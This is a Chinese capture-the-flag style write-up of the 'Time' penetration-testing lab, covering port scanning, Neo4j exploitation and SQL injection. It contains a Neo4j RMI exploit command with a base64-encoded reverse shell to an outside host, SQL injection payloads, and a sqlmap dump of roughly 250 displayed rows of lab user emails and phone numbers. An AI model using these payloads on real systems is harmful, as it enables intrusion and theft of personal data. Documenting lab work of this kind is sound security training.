---
typora-root-url: 春秋云境Time
title: 春秋云境Time
toc: true
categories:
  - 技术
  - web
  - wp
date: 2025-03-06 22:15:08
tags: 
  - 渗透测试
---

# 春秋云境Time

fsan扫

```
E:\Users\tiand>fscan -h 39.98.108.227
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[796ms]     已选择服务扫描模式
[797ms]     开始信息扫描
[797ms]     最终有效主机数量: 1
[797ms]     开始主机扫描
[797ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[797ms]     有效端口数量: 233
[906ms] [*] 端口开放 39.98.108.227:7687
[916ms] [*] 端口开放 39.98.108.227:22
[3.8s]     扫描完成, 发现 2 个开放端口
[3.8s]     存活端口数量: 2
[3.8s]     开始漏洞扫描
[3.8s]     POC加载完成: 总共387个，成功387个，失败0个
[4.7s] [*] 网站标题 https://39.98.108.227:7687 状态码:400 长度:50     标题:无标题
[53.6s]     扫描已完成: 4/4
```

这里干瞪眼了，外网扫描（有时候内网也是）一定要在没东西的时候多加扫描范围

```
E:\Users\tiand>fscan -h 39.98.108.227 -p all
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.1

[875ms]     已选择服务扫描模式
[875ms]     开始信息扫描
[875ms]     最终有效主机数量: 1
[875ms]     开始主机扫描
[875ms]     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[881ms]     有效端口数量: 65535
[1.0s] [*] 端口开放 39.98.108.227:22
[6.2s] [*] 端口开放 39.98.108.227:1337
[31.7s] [*] 端口开放 39.98.108.227:7473
[31.7s] [*] 端口开放 39.98.108.227:7474
[31.8s] [*] 端口开放 39.98.108.227:7687
[2m54s] [*] 端口开放 39.98.108.227:41225
[4m40s]     扫描完成, 发现 6 个开放端口
[4m40s]     存活端口数量: 6
[4m40s]     开始漏洞扫描
[4m40s]     POC加载完成: 总共387个，成功387个，失败0个
[4m41s] [*] 网站标题 https://39.98.108.227:7687 状态码:400 长度:50     标题:无标题
[5m30s]     扫描已完成: 4/4
```

## 入口点

7474端口打开一看是Neo4j，找nday去打

```
└─$ searchsploit Neo4j
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Neo4j 3.4.18 - RMI based Remote Code Execution (RCE)                                  | java/remote/50170.java
-------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

![image-20260306185516900](/image-20260306185516900.png)

```
D:\download>java8 -jar "rhino_gadget.jar" rmi://39.98.108.227:1337 "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTIxLjM3LjE2LjEzOS85OTk5IDA+JjEK}|{base64,-d}|bash"

$ find / -name flag* 2>/dev/null
/usr/src/linux-headers-5.4.0-113/scripts/coccinelle/locks/flags.cocci
/usr/src/linux-headers-5.4.0-26-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-113-generic/include/config/arch/uses/high/vma/flags.h
/usr/src/linux-headers-5.4.0-26/scripts/coccinelle/locks/flags.cocci
/home/neo4j/flag01.txt
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/pci0000:00/0000:00:05.0/virtio2/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/proc/sys/kernel/sched_domain/cpu0/domain0/flags
/proc/sys/kernel/sched_domain/cpu1/domain0/flags
$ cat /home/neo4j/flag01.txt
 ██████████ ██
░░░░░██░░░ ░░
    ░██     ██ ██████████   █████
    ░██    ░██░░██░░██░░██ ██░░░██
    ░██    ░██ ░██ ░██ ░██░███████
    ░██    ░██ ░██ ░██ ░██░██░░░░
    ░██    ░██ ███ ░██ ░██░░██████
    ░░     ░░ ░░░  ░░  ░░  ░░░░░░


flag01: flag{5cbc77e2-6e51-497d-86a1-253f758e27dd}

Do you know the authentication process of Kerberos?
......This will be the key to your progress.

ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:0d:e2:1d brd ff:ff:ff:ff:ff:ff
    inet 172.22.6.36/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 1892155407sec preferred_lft 1892155407sec
    inet6 fe80::216:3eff:fe0d:e21d/64 scope link
       valid_lft forever preferred_lft forever
```

vps python3 -m http.server 8080启服务

传fscan与代理工具

```
$ cat res*
172.22.6.12:88 open
172.22.6.12:445 open
172.22.6.25:445 open
172.22.6.12:139 open
172.22.6.25:139 open
172.22.6.12:135 open
172.22.6.25:135 open
172.22.6.38:80 open
172.22.6.36:22 open
172.22.6.38:22 open
172.22.6.36:7687 open
[*] NetInfo
[*]172.22.6.12
   [->]DC-PROGAME
   [->]172.22.6.12
[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.6.25     XIAORANG\WIN2019
[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393
[*] NetInfo
[*]172.22.6.25
   [->]WIN2019
   [->]172.22.6.25
[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录
[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None

172.22.6.36（入口点）
172.22.6.25（WIN2019）
172.22.6.38（WEB）
172.22.6.12（DC）
```

## sql注入

38是web服务，先打这个，一个登录界面，用户是admin，弱口令尝试失败，尝试sql注入

username=admin&password=1%27+or+sleep%2810%29%23

发现是sql注入，sqlmap跑

```
└─$  sqlmap -u 172.22.6.38/index.php --data='username=admin&password=1*'  --proxy="socks5://192.168.22.109:1234" --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:48:54 /2026-03-06/

custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]

[19:48:55] [INFO] resuming back-end DBMS 'mysql'
[19:48:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin&password=1' AND (SELECT 8639 FROM (SELECT(SLEEP(5)))ohcP) AND 'RKBQ'='RKBQ

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=admin&password=1' UNION ALL SELECT NULL,CONCAT(0x716a787671,0x52694d42496c4a78456b665a41486446674f6e77475453704e4b7155535068646571466964456a68,0x7176707171),NULL-- -
---
[19:48:55] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL >= 5.0.12
[19:48:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[19:48:55] [INFO] fetching current database
[19:48:55] [INFO] fetching tables for database: 'oa_db'
[19:48:55] [INFO] fetching columns for table 'oa_users' in database 'oa_db'
[19:48:55] [INFO] fetching entries for table 'oa_users' in database 'oa_db'
Database: oa_db
Table: oa_users
[500 entries]
+-----+----------------------------+-------------+-----------------+
| id  | email                      | phone       | username        |
+-----+----------------------------+-------------+-----------------+
[19:48:55] [WARNING] console output will be trimmed to last 256 rows due to large table size
| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        |
| 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        |
| 247 | buning@xiaorang.lab        | 13046481392 | BU NING         |
| 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         |
| 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         |
| 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           |
| 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      |
| 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        |
| 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       |
| 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          |
| 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         |
| 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          |
| 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           |
| 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    |
| 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         |
| 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         |
| 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         |
| 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         |
| 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         |
| 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       |
| 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         |
| 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          |
| 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        |
| 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  |
| 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       |
| 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        |
| 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       |
| 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       |
| 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          |
| 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        |
| 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       |
| 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        |
| 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        |
| 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     |
| 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         |
| 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     |
| 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        |
| 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         |
| 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          |
| 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        |
| 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       |
| 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        |
| 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         |
| 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          |
| 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     |
| 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          |
| 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         |
| 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       |
| 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          |
| 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           |
| 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     |
| 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        |
| 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       |
| 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        |
| 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       |
| 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       |
| 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         |
| 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          |
| 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        |
| 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        |
| 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          |
| 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      |
| 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         |
| 308 | didi@xiaorang.lab          | 13413041463 | DI DI           |
| 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         |
| 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       |
| 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        |
| 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          |
| 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     |
| 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     |
| 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        |
| 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       |
| 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        |
| 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        |
| 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          |
| 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           |
| 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         |
| 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       |
| 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         |
| 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        |
| 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         |
| 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING |
| 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        |
| 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         |
| 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          |
| 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    |
| 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    |
| 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          |
| 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         |
| 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         |
| 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          |
| 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       |
| 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      |
| 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          |
| 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          |
| 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       |
| 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         |
| 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         |
| 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      |
| 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          |
| 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       |
| 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        |
| 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         |
| 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         |
| 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          |
| 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          |
| 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        |
| 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       |
| 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       |
| 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        |
| 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      |
| 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         |
| 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        |
| 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      |
| 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       |
| 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        |
| 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         |
| 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        |
| 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           |
| 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           |
| 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          |
| 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      |
| 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       |
| 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         |
| 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         |
| 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         |
| 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         |
| 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         |
| 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        |
| 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        |
| 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        |
| 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     |
| 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     |
| 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        |
| 379 | heli@xiaorang.lab          | 13701347081 | HE LI           |
| 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        |
| 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          |
| 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       |
| 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       |
| 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          |
| 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          |
| 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       |
| 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           |
| 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         |
| 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        |
| 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         |
| 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    |
| 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         |
| 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        |
| 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          |
| 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          |
| 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     |
| 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        |
| 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          |
| 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          |
| 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       |
| 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        |
| 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       |
| 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          |
| 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       |
| 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        |
| 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        |
| 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         |
| 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       |
| 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        |
| 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        |
| 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         |
| 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       |
| 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         |
| 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          |
| 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       |
| 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       |
| 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          |
| 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         |
| 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         |
| 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         |
| 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       |
| 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   |
| 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         |
| 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         |
| 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          |
| 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          |
| 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        |
| 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    |
| 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        |
| 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         |
| 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     |
| 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        |
| 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        |
| 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         |
| 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       |
| 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        |
| 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   |
| 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    |
| 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       |
| 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        |
| 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     |
| 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     |
| 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           |
| 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          |
| 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         |
| 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          |
| 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          |
| 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        |
| 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  |
| 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     |
| 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          |
| 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      |
| 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        |
| 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    |
| 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       |
| 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         |
| 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          |
| 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        |
| 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          |
| 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         |
| 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        |
| 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       |
| 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         |
| 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         |
| 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      |
| 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         |
| 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       |
| 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        |
| 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        |
| 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          |
| 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       |
| 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           |
| 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       |
| 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        |
| 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         |
| 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         |
| 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       |
| 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       |
| 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           |
| 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        |
| 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         |
| 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         |
| 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       |
| 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         |
| 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         |
| 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   |
| 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        |
| 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       |
| 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          |
| 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        |
| 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          |
| 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    |
| 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           |
| 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          |
| 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         |
| 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         |
| 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     |
| 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           |
| 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       |
| 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |
+-----+----------------------------+-------------+-----------------+

[19:48:55] [INFO] table 'oa_db.oa_users' dumped to CSV file '/home/xiaotian/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv'
[19:48:55] [INFO] fetching columns for table 'oa_f1Agggg' in database 'oa_db'
[19:48:55] [INFO] fetching entries for table 'oa_f1Agggg' in database 'oa_db'
Database: oa_db
Table: oa_f1Agggg
[1 entry]
+----+--------------------------------------------+
| id | flag02                                     |
+----+--------------------------------------------+
| 1  | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |
+----+--------------------------------------------+

[19:48:55] [INFO] table 'oa_db.oa_f1Agggg' dumped to CSV file '/home/xiaotian/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_f1Agggg.csv'
